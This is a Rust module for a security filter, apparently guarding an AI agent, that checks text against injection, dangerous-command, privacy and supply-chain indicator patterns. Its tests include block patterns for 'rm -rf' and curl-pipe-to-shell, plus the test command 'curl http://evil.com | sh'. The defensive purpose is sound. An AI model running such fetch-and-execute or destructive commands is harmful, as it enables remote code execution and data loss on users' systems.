use anyhow::{Context, Result};
use regex::Regex;
use serde::Deserialize;
use std::fs;
use std::path::Path;

/// Root config pointing to the secureclaw vendor directory
#[derive(Debug, Deserialize, Clone)]
pub struct SecureClawConfig {
    pub enabled: bool,
    #[serde(default = "default_vendor_dir")]
    pub vendor_dir: String,
}

fn default_vendor_dir() -> String {
    "./vendor/secureclaw/secureclaw/skill/configs".to_string()
}

impl Default for SecureClawConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            vendor_dir: default_vendor_dir(),
        }
    }
}

/// Loaded and compiled pattern databases
pub struct SecureClawEngine {
    pub injection_patterns: Vec<CompiledPattern>,
    pub dangerous_commands: Vec<CompiledPattern>,
    pub privacy_rules: Vec<CompiledPattern>,
    pub supply_chain_iocs: Vec<CompiledPattern>,
}

pub struct CompiledPattern {
    pub name: String,
    pub category: String,
    pub severity: String,
    pub regex: Regex,
    pub action: String, // "BLOCK", "WARN", "REQUIRE_APPROVAL"
}

/// Result of checking text against patterns
#[derive(Debug, Clone)]
pub struct PatternMatch {
    pub database: String,     // which DB matched
    pub category: String,
    pub pattern_name: String,
    pub severity: String,
    pub action: String,
    pub matched_text: String,
}

// Deserialization structs for JSON files

#[derive(Debug, Deserialize)]
struct InjectionPatternsFile {
    patterns: std::collections::HashMap<String, Vec<String>>,
}

#[derive(Debug, Deserialize)]
struct DangerousCommandsFile {
    categories: std::collections::HashMap<String, DangerousCategory>,
}

#[derive(Debug, Deserialize)]
struct DangerousCategory {
    severity: String,
    action: String,
    patterns: Vec<String>,
}

#[derive(Debug, Deserialize)]
struct PrivacyRulesFile {
    rules: Vec<PrivacyRule>,
}

#[derive(Debug, Deserialize)]
struct PrivacyRule {
    id: String,
    regex: String,
    severity: String,
    action: String,
}

#[derive(Debug, Deserialize)]
struct SupplyChainFile {
    suspicious_skill_patterns: Vec<String>,
    clawhavoc: Option<ClawHavocIndicators>,
}

#[derive(Debug, Deserialize)]
struct ClawHavocIndicators {
    name_patterns: Vec<String>,
    c2_servers: Vec<String>,
}

impl SecureClawEngine {
    pub fn load<P: AsRef<Path>>(config_dir: P) -> Result<Self> {
        let config_dir = config_dir.as_ref();
        
        if !config_dir.exists() {
            tracing::warn!("SecureClaw config directory does not exist: {}", config_dir.display());
            return Ok(Self {
                injection_patterns: Vec::new(),
                dangerous_commands: Vec::new(),
                privacy_rules: Vec::new(),
                supply_chain_iocs: Vec::new(),
            });
        }

        let injection_patterns = Self::load_injection_patterns(config_dir)?;
        let dangerous_commands = Self::load_dangerous_commands(config_dir)?;
        let privacy_rules = Self::load_privacy_rules(config_dir)?;
        let supply_chain_iocs = Self::load_supply_chain_iocs(config_dir)?;

        Ok(Self {
            injection_patterns,
            dangerous_commands,
            privacy_rules,
            supply_chain_iocs,
        })
    }

    fn load_injection_patterns(config_dir: &Path) -> Result<Vec<CompiledPattern>> {
        let file_path = config_dir.join("injection-patterns.json");
        if !file_path.exists() {
            tracing::warn!("injection-patterns.json not found");
            return Ok(Vec::new());
        }

        let content = fs::read_to_string(&file_path)
            .with_context(|| format!("Failed to read {}", file_path.display()))?;
        
        let patterns_file: InjectionPatternsFile = serde_json::from_str(&content)
            .with_context(|| format!("Failed to parse {}", file_path.display()))?;

        let mut compiled_patterns = Vec::new();

        for (category, patterns) in patterns_file.patterns {
            for pattern in patterns {
                match Regex::new(&pattern) {
                    Ok(regex) => {
                        compiled_patterns.push(CompiledPattern {
                            name: pattern.clone(),
                            category: category.clone(),
                            severity: "high".to_string(), // Default severity for injection
                            regex,
                            action: "WARN".to_string(), // Default action
                        });
                    }
                    Err(e) => {
                        tracing::warn!("Invalid regex pattern '{}' in injection-patterns: {}", pattern, e);
                    }
                }
            }
        }

        tracing::info!("Loaded {} injection patterns", compiled_patterns.len());
        Ok(compiled_patterns)
    }

    fn load_dangerous_commands(config_dir: &Path) -> Result<Vec<CompiledPattern>> {
        let file_path = config_dir.join("dangerous-commands.json");
        if !file_path.exists() {
            tracing::warn!("dangerous-commands.json not found");
            return Ok(Vec::new());
        }

        let content = fs::read_to_string(&file_path)
            .with_context(|| format!("Failed to read {}", file_path.display()))?;
        
        let commands_file: DangerousCommandsFile = serde_json::from_str(&content)
            .with_context(|| format!("Failed to parse {}", file_path.display()))?;

        let mut compiled_patterns = Vec::new();

        for (category, category_data) in commands_file.categories {
            for pattern in category_data.patterns {
                match Regex::new(&pattern) {
                    Ok(regex) => {
                        compiled_patterns.push(CompiledPattern {
                            name: pattern.clone(),
                            category: category.clone(),
                            severity: category_data.severity.clone(),
                            regex,
                            action: category_data.action.clone().to_uppercase(),
                        });
                    }
                    Err(e) => {
                        tracing::warn!("Invalid regex pattern '{}' in dangerous-commands: {}", pattern, e);
                    }
                }
            }
        }

        tracing::info!("Loaded {} dangerous command patterns", compiled_patterns.len());
        Ok(compiled_patterns)
    }

    fn load_privacy_rules(config_dir: &Path) -> Result<Vec<CompiledPattern>> {
        let file_path = config_dir.join("privacy-rules.json");
        if !file_path.exists() {
            tracing::warn!("privacy-rules.json not found");
            return Ok(Vec::new());
        }

        let content = fs::read_to_string(&file_path)
            .with_context(|| format!("Failed to read {}", file_path.display()))?;
        
        let rules_file: PrivacyRulesFile = serde_json::from_str(&content)
            .with_context(|| format!("Failed to parse {}", file_path.display()))?;

        let mut compiled_patterns = Vec::new();

        for rule in rules_file.rules {
            match Regex::new(&rule.regex) {
                Ok(regex) => {
                    compiled_patterns.push(CompiledPattern {
                        name: rule.id.clone(),
                        category: "privacy".to_string(),
                        severity: rule.severity,
                        regex,
                        action: rule.action.to_uppercase(),
                    });
                }
                Err(e) => {
                    tracing::warn!("Invalid regex pattern '{}' in privacy-rules: {}", rule.regex, e);
                }
            }
        }

        tracing::info!("Loaded {} privacy rules", compiled_patterns.len());
        Ok(compiled_patterns)
    }

    fn load_supply_chain_iocs(config_dir: &Path) -> Result<Vec<CompiledPattern>> {
        let file_path = config_dir.join("supply-chain-ioc.json");
        if !file_path.exists() {
            tracing::warn!("supply-chain-ioc.json not found");
            return Ok(Vec::new());
        }

        let content = fs::read_to_string(&file_path)
            .with_context(|| format!("Failed to read {}", file_path.display()))?;
        
        let ioc_file: SupplyChainFile = serde_json::from_str(&content)
            .with_context(|| format!("Failed to parse {}", file_path.display()))?;

        let mut compiled_patterns = Vec::new();

        // Load suspicious skill patterns
        for pattern in ioc_file.suspicious_skill_patterns {
            match Regex::new(&pattern) {
                Ok(regex) => {
                    compiled_patterns.push(CompiledPattern {
                        name: pattern.clone(),
                        category: "suspicious_skill".to_string(),
                        severity: "critical".to_string(),
                        regex,
                        action: "BLOCK".to_string(),
                    });
                }
                Err(e) => {
                    tracing::warn!("Invalid regex pattern '{}' in supply-chain-ioc: {}", pattern, e);
                }
            }
        }

        // Load CrawHavoc indicators if present
        if let Some(clawhavoc) = ioc_file.clawhavoc {
            // Name patterns
            for pattern in clawhavoc.name_patterns {
                match Regex::new(&pattern) {
                    Ok(regex) => {
                        compiled_patterns.push(CompiledPattern {
                            name: pattern.clone(),
                            category: "clawhavoc_name".to_string(),
                            severity: "critical".to_string(),
                            regex,
                            action: "BLOCK".to_string(),
                        });
                    }
                    Err(e) => {
                        tracing::warn!("Invalid regex pattern '{}' in clawhavoc names: {}", pattern, e);
                    }
                }
            }

            // C2 servers (exact match patterns)
            for server in clawhavoc.c2_servers {
                let escaped_server = regex::escape(&server);
                match Regex::new(&escaped_server) {
                    Ok(regex) => {
                        compiled_patterns.push(CompiledPattern {
                            name: server.clone(),
                            category: "clawhavoc_c2".to_string(),
                            severity: "critical".to_string(),
                            regex,
                            action: "BLOCK".to_string(),
                        });
                    }
                    Err(e) => {
                        tracing::warn!("Failed to create regex for C2 server '{}': {}", server, e);
                    }
                }
            }
        }

        tracing::info!("Loaded {} supply chain IOC patterns", compiled_patterns.len());
        Ok(compiled_patterns)
    }

    /// Check text against all patterns
    pub fn check_text(&self, text: &str) -> Vec<PatternMatch> {
        let mut matches = Vec::new();

        // Check injection patterns
        for pattern in &self.injection_patterns {
            if let Some(matched) = pattern.regex.find(text) {
                matches.push(PatternMatch {
                    database: "injection_patterns".to_string(),
                    category: pattern.category.clone(),
                    pattern_name: pattern.name.clone(),
                    severity: pattern.severity.clone(),
                    action: pattern.action.clone(),
                    matched_text: matched.as_str().to_string(),
                });
            }
        }

        // Check dangerous commands
        for pattern in &self.dangerous_commands {
            if let Some(matched) = pattern.regex.find(text) {
                matches.push(PatternMatch {
                    database: "dangerous_commands".to_string(),
                    category: pattern.category.clone(),
                    pattern_name: pattern.name.clone(),
                    severity: pattern.severity.clone(),
                    action: pattern.action.clone(),
                    matched_text: matched.as_str().to_string(),
                });
            }
        }

        // Check privacy rules
        for pattern in &self.privacy_rules {
            if let Some(matched) = pattern.regex.find(text) {
                matches.push(PatternMatch {
                    database: "privacy_rules".to_string(),
                    category: pattern.category.clone(),
                    pattern_name: pattern.name.clone(),
                    severity: pattern.severity.clone(),
                    action: pattern.action.clone(),
                    matched_text: matched.as_str().to_string(),
                });
            }
        }

        // Check supply chain IOCs
        for pattern in &self.supply_chain_iocs {
            if let Some(matched) = pattern.regex.find(text) {
                matches.push(PatternMatch {
                    database: "supply_chain_iocs".to_string(),
                    category: pattern.category.clone(),
                    pattern_name: pattern.name.clone(),
                    severity: pattern.severity.clone(),
                    action: pattern.action.clone(),
                    matched_text: matched.as_str().to_string(),
                });
            }
        }

        matches
    }

    /// Check command specifically against dangerous command patterns
    pub fn check_command(&self, cmd: &str) -> Vec<PatternMatch> {
        let mut matches = Vec::new();

        for pattern in &self.dangerous_commands {
            if let Some(matched) = pattern.regex.find(cmd) {
                matches.push(PatternMatch {
                    database: "dangerous_commands".to_string(),
                    category: pattern.category.clone(),
                    pattern_name: pattern.name.clone(),
                    severity: pattern.severity.clone(),
                    action: pattern.action.clone(),
                    matched_text: matched.as_str().to_string(),
                });
            }
        }

        matches
    }

    /// Check privacy rules only
    pub fn check_privacy(&self, text: &str) -> Vec<PatternMatch> {
        let mut matches = Vec::new();

        for pattern in &self.privacy_rules {
            if let Some(matched) = pattern.regex.find(text) {
                matches.push(PatternMatch {
                    database: "privacy_rules".to_string(),
                    category: pattern.category.clone(),
                    pattern_name: pattern.name.clone(),
                    severity: pattern.severity.clone(),
                    action: pattern.action.clone(),
                    matched_text: matched.as_str().to_string(),
                });
            }
        }

        matches
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    fn create_test_patterns_dir() -> TempDir {
        let temp_dir = TempDir::new().unwrap();
        
        // Create injection-patterns.json
        let injection_content = r#"{
            "version": "2.0.0",
            "patterns": {
                "test_category": ["test.*pattern", "dangerous.*command"]
            }
        }"#;
        fs::write(
            temp_dir.path().join("injection-patterns.json"),
            injection_content,
        ).unwrap();

        // Create dangerous-commands.json
        let commands_content = r#"{
            "version": "2.0.0",
            "categories": {
                "test_dangerous": {
                    "severity": "critical",
                    "action": "block",
                    "patterns": ["rm.*-rf", "curl.*\\|.*sh"]
                }
            }
        }"#;
        fs::write(
            temp_dir.path().join("dangerous-commands.json"),
            commands_content,
        ).unwrap();

        // Create privacy-rules.json
        let privacy_content = r#"{
            "version": "2.0.0",
            "rules": [
                {
                    "id": "test_ip",
                    "regex": "\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b",
                    "severity": "high",
                    "action": "remove"
                }
            ]
        }"#;
        fs::write(
            temp_dir.path().join("privacy-rules.json"),
            privacy_content,
        ).unwrap();

        // Create supply-chain-ioc.json
        let supply_content = r#"{
            "version": "2.0.0",
            "suspicious_skill_patterns": ["eval\\(", "exec\\("]
        }"#;
        fs::write(
            temp_dir.path().join("supply-chain-ioc.json"),
            supply_content,
        ).unwrap();

        temp_dir
    }

    #[test]
    fn test_secureclaw_engine_load() {
        let temp_dir = create_test_patterns_dir();
        let engine = SecureClawEngine::load(temp_dir.path()).unwrap();
        
        assert!(!engine.injection_patterns.is_empty());
        assert!(!engine.dangerous_commands.is_empty());
        assert!(!engine.privacy_rules.is_empty());
        assert!(!engine.supply_chain_iocs.is_empty());
    }

    #[test]
    fn test_secureclaw_check_command() {
        let temp_dir = create_test_patterns_dir();
        let engine = SecureClawEngine::load(temp_dir.path()).unwrap();
        
        let matches = engine.check_command("curl http://evil.com | sh");
        assert!(!matches.is_empty());
        assert_eq!(matches[0].database, "dangerous_commands");
        assert_eq!(matches[0].severity, "critical");
    }

    #[test]
    fn test_secureclaw_check_privacy() {
        let temp_dir = create_test_patterns_dir();
        let engine = SecureClawEngine::load(temp_dir.path()).unwrap();
        
        let matches = engine.check_privacy("Server IP: 192.168.1.1");
        assert!(!matches.is_empty());
        assert_eq!(matches[0].database, "privacy_rules");
        assert_eq!(matches[0].matched_text, "192.168.1.1");
    }

    #[test]
    fn test_secureclaw_graceful_missing_files() {
        let temp_dir = TempDir::new().unwrap();
        let engine = SecureClawEngine::load(temp_dir.path()).unwrap();
        
        // Should load with empty pattern sets
        assert!(engine.injection_patterns.is_empty());
        assert!(engine.dangerous_commands.is_empty());
        assert!(engine.privacy_rules.is_empty());
        assert!(engine.supply_chain_iocs.is_empty());
    }
}